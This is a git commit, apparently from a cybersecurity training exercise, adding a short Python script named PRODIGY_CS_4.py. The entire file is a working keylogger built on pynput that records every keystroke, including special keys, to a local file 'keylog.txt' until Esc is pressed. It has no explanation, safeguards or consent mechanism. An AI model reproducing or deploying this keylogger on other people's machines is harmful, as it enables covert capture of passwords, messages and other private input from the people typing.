657a76f8b9101aff7e484381f3879517ef472fa4
pournami07 <pournamitv7@gmail.com>
2024-05-15 13:11:05 +0530

    Create PRODIGY_CS_4.py

---
+++ PRODIGY_CS_4.py
@@ -0,0 +1,20 @@
+from pynput.keyboard import Listener, Key
+
+log_file = "keylog.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(str(key.char))
+    except AttributeError:
+        # Handle special keys
+        with open(log_file, "a") as f:
+            f.write(f"[{key}]")
+
+def on_release(key):
+    if key == Key.esc:
+        # Stop listener
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
